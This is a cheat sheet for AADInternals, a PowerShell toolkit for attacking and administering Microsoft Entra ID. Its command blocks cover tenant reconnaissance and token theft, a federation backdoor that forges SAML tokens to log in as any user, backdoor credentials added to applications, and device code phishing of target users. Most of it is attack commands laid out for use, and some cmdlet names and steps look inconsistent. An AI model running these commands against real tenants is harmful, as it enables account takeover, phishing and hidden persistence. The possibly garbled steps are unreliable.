# AADInternals — Azure AD/Entra ID Administration and Reconnaissance

PowerShell toolkit for administering, auditing, and attacking Microsoft Entra ID (formerly Azure AD). Covers tenant reconnaissance, token manipulation, federation abuse, and tactical operations.

## How It Works

AADInternals uses a combination of REST API calls to Microsoft Graph, Azure AD Graph, MS Online PowerShell, and legacy Exchange/SharePoint endpoints. It implements its own OAuth 2.0 flows (device code, ROPC, SAML bearer assertion) to acquire tokens without an official Microsoft SDK.

**Capability areas:**

| Area | Capabilities |
|------|-------------|
| **Tenant Recon** | Enumerate domains, verify tenant, discover admins, export users, enumerate conditional access, MFA status, named locations |
| **Token Operations** | Acquire tokens (all OAuth flows), refresh tokens, convert between token types, inspect JWT, detect token signing key |
| **Privilege Escalation** | Modify domain federation settings, update domain authentication (managed → federated), bypass MFA with SAML assertions |
| **Persistence** | Add credentials to applications, modify service principal passwords, set up OAuth consent grants |
| **Recon** | Export app registrations, service principals, directory roles, group memberships, administrative units |
| **Cloud-only Attacks** | Device code phishing, token theft, pass-the-cookie, app role escalation |
| **Teams/SharePoint** | List Teams, enumerate messages, access SharePoint sites |

**Key tactics:**
- **Dynamics 365 / Exchange Online token acquisition** — sometimes bypasses Conditional Access that blocks other apps
- **Federation backdoor** — change domain authentication from managed (cloud password) to federated → authenticate as any user without knowing their password
- **SAML assertion signing** — use internal signing certificate to forge SAML tokens for federated domains
- **Device Registration** — register rogue device to satisfy device-based Conditional Access policies

## Manual

### Import Module

```powershell
# Install from PSGallery
Install-Module -Name AADInternals -Scope CurrentUser
Import-Module AADInternals

# Or download AADInternals.psm1 directly
Import-Module .\AADInternals.psm1
```

### Tenant Reconnaissance

```powershell
# Verify tenant exists and get basic info
Get-AADIntTenantDetails -Domain domain.com

# Enumerate all domains in tenant (needs token)
Get-AADIntTenantDomains

# Domain verification (no auth required)
Invoke-AADIntReconAsOutsider -DomainName domain.com
Invoke-AADIntReconAsOutsider -DomainName domain.com | Format-Table

# Enumerate all users (needs token)
Get-AADIntUsers | Format-Table UserPrincipalName,DisplayName,DirSyncEnabled
```

### Token Acquisition

```powershell
# Device code flow (interactive, works with MFA)
Get-AADIntAccessTokenForAzureAD -DeviceCode

# Username/password (ROPC — blocked by MFA)
Get-AADIntAccessTokenForAzureAD -UserPrincipalName user@domain.com

# With client credentials
Get-AADIntAccessTokenForAADGraph -ClientId <guid> -ClientSecret <secret>

# Acquire token for specific resource
Get-AADIntAccessTokenForMSGraph -SaveToCache
Get-AADIntAccessTokenForExchangeOnline
Get-AADIntAccessTokenForDynamicsCRM

# Reuse saved token
Set-AADIntAccessToken -AccessToken $token
```

### Federation Backdoor

```powershell
# 1. Convert domain from Managed to Federated (needs Global Admin + ADFS server access)
#    On Microsoft side:
Set-AADIntAutopilotAuthentication -DomainName domain.com -Username admin@domain.com -Password 'Pass!'

#    On ADFS side:
Set-AADIntADFSSigningCertificate -Domain domain.com

# 2. Forge SAML token for any user
$saml = New-AADIntSAMLToken -Domain domain.com -UserPrincipalName "admin@domain.com"
Get-AADIntAccessTokenForAzureAD -SAML -SAMLToken $saml

# 3. Use token to access Graph
$token = Get-AADIntAccessTokenForMSGraph -SAMLToken $saml
Invoke-AADIntGraphQuery -AccessToken $token -Path "users"
```

### Application and Service Principal Manipulation

```powershell
# List all app registrations
Get-AADIntApplications

# Add credential (password) to an application
Add-AADIntAppPassword -AppId <guid> -DisplayName "BackdoorKey"

# Add credential to a service principal
Add-AADIntServicePrincipalPassword -SPN "https://app/"

# Get application owner — can escalate via owner rights
Get-AADIntApplicationOwner -AppId <guid>
```

### Conditional Access and MFA Audit

```powershell
# List Conditional Access policies
Get-AADIntConditionalAccessPolicies

# Detect MFA registration status per user
Get-AADIntMFAStatus | Format-Table UserPrincipalName,MFAStatus,MethodsRegistered

# Named locations
Get-AADIntNamedLocations
```

### Device Code Phishing

```powershell
# Generate device code for a non-MFA-approved API
$dc = Get-AADIntDeviceCode -Resource MicrosoftGraph
$dc.Message     # Send this to target user
$dc.DeviceCode  # Polling token

# Wait for user to authenticate, then:
$token = Get-AADIntTokenFromDeviceCode -DeviceCode $dc
# Token → Graph API access as the target user
```

### Teams Recon

```powershell
# Requires token with MicrosoftGraph resource
Set-AADIntAccessToken -AccessToken $token
Get-AADIntTeams
Get-AADIntTeamsMessages -TeamId <guid>
```

## Build / Install

```powershell
# PowerShell Gallery
Install-Module -Name AADInternals -Scope CurrentUser

# Direct download
Invoke-WebRequest -Uri https://raw.githubusercontent.com/Gerenios/AADInternals/master/AADInternals.psm1 -OutFile AADInternals.psm1
Invoke-WebRequest -Uri https://raw.githubusercontent.com/Gerenios/AADInternals/master/AADInternals.psd1 -OutFile AADInternals.psd1

# Import
Import-Module .\AADInternals.psd1
```

## Package

| Manager | Command |
|---------|---------|
| PowerShell Gallery | `Install-Module AADInternals -Scope CurrentUser` |
| GitHub | https://github.com/Gerenios/AADInternals |

## Links

| Resource | URL |
|----------|-----|
| GitHub | https://github.com/Gerenios/AADInternals |
| Wiki / command list | https://github.com/Gerenios/AADInternals |
| PSGallery | https://www.powershellgallery.com/packages/AADInternals |
| Blog (Dr. Nestori Syynimaa) | https://aadinternals.com/blog/ |
| Tool documentation | https://aadinternals.com/aadinternals/ |
| Device code phishing | https://aadinternals.com/post/phishing/ |
| Federation backdoor | https://aadinternals.com/post/adfs/ |
